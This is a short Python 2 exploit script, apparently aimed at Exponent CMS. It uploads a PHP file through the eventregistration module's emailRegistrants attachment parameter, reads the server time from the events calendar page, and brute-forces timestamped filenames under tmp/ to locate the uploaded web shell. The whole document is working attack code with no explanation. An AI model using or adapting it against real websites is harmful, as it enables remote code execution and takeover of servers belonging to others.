import requests
base_url='http://localhost/exponent/'
url_for_time='index.php?module=eventregistration&action=eventsCalendar'
url_for_upload='index.php?module=eventregistration&action=emailRegistrants&email_addresses=123456789@123.com&email_message=1&email_subject=1'

files={'attach':open('index.php','rb')}

requests.post(base_url+url_for_upload,files=files)

print 'upload finish'

r=requests.get(base_url+url_for_time)
html1=r.content
#print html1
index=r.content.find('History.pushState')
if index:
    time=html1[index:index+60].split('rel')[1].split('\'')[1]
else:
    print 'something wrong'
    exit(0)
print "get time:"+ time

for i in range(int(time),int(time)-20,-1):
    shell_url=base_url+'tmp/'+str(i)+'_index.php'
    r2=requests.get(shell_url)
    if r2.status_code==200:
        print "shell is here : "+shell_url 

      



